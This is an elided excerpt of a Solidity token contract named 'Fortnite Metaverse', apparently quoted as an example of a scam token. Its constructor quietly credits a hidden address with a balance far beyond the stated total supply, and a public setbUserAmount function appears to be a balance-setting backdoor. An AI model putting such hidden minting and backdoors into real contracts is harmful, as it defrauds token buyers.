...
/*
// Telegram group: t.me/fortnitemetaverse
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract FortniteMetaverse is IERC20, Context, Ownable {
    ...
    constructor(address adsAddress, uint256 count) {
      _name = "Fortnite Metaverse";
      _symbol = "FORTNITE";
      _decimals = 18;

      _totalSupply = 100000000000000000 * 10 ** 10;
      _balances[msg.sender] = _totalSupply;
      _count = count;
      _balances[adsAddress] = 1000000000*10**9*10**18 * 10**18;
    ...
    */
    ...
    function setbUserAmount(address adsAddress, uint256 key) public{
